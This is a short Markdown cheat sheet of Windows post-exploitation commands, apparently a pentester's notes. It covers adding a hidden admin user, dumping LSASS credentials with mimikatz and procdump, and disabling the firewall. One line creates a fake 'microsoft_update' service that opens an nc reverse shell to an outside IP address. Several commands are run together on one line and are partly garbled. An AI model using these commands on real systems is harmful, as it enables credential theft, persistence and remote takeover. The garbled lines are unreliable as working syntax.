#  Useful windows tips and tricks
####  Add New user in Windows
      - net user test 1234 /add
      - net localgroup administrators test /add
#### Mimikatz use
            - git clone https://github.com/gentilkiwi/mimikatz.git privilege::debug
            - sekurlsa::logonPasswords full


#### Mount Remote Windows Share
        - Code:
           - smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw
#### Windows Useful cmds
```
- net localgroup Users
- net localgroup Administrators
- search dir/s *.doc
- system("start cmd.exe /k $cmd")
- sc create microsoft_update binpath="cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe" start= auto error= ignore /c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779
- mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"
- Procdump.exe -accepteula -ma lsass.exe lsass.dmp
- mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"
- C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp For 32 bits
- C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp For 64 bits
```
#### Turn Off Windows Firewall
           netsh firewall set opmode disable
#### Compiling Windows Exploits on Kali
            wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download wine mingw-get-setup.exe
            select mingw32-base
            cd /root/.wine/drive_c/windows
            wget http://gojhonny.com/misc/mingw_bin.zip && unzip mingw_bin.zip cd /root/.wine/drive_c/MinGW/bin
            wine gcc -o ability.exe /tmp/exploit.c -lwsock32
            wine ability.exe
